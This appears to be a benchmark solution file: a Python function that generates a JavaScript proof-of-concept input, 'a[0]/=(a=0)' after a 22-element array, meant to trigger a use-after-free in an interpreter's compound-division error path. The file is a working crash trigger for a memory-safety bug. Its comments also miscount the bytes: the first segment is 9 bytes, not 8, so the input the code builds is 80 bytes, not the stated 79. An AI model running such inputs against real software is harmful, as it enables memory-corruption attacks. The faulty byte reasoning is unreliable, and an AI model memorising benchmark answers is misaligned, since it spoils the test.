import sys

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.

        Args:
            src_path: Path to the vulnerable source code tarball

        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # The vulnerability is a use-after-free in compound division by zero.
        # It occurs when the left-hand operand is destroyed during the evaluation
        # of the right-hand side.
        # The pattern is `a[i] /= (a = 0)`.
        # When evaluating the RHS `(a = 0)`, the original object `a` is freed.
        # The interpreter then attempts to use a stale reference to `a` to
        # perform the division on `a[i]`, resulting in a UAF.
        # The division by zero ensures the operation fails, exercising the
        # vulnerable error-handling code path.

        # A long array is used to ensure it's allocated on the heap, bypassing
        # potential small-object optimizations that might prevent the bug.
        # The ground-truth length of 79 bytes suggests a specific size is needed.
        # We construct a PoC that matches this length and pattern.

        # `var a = [1,2,...,22]; a[0]/=(a=0);` has a length of 79 bytes.
        # - "var a = ["         (8 bytes)
        # - "1,2,...,22"         (56 bytes)
        # - "]; a[0]/=(a=0);"   (15 bytes)
        # Total: 8 + 56 + 15 = 79 bytes.

        numbers_str = ','.join(map(str, range(1, 23)))
        poc_code = f"var a = [{numbers_str}]; a[0]/=(a=0);"

        return poc_code.encode('utf-8')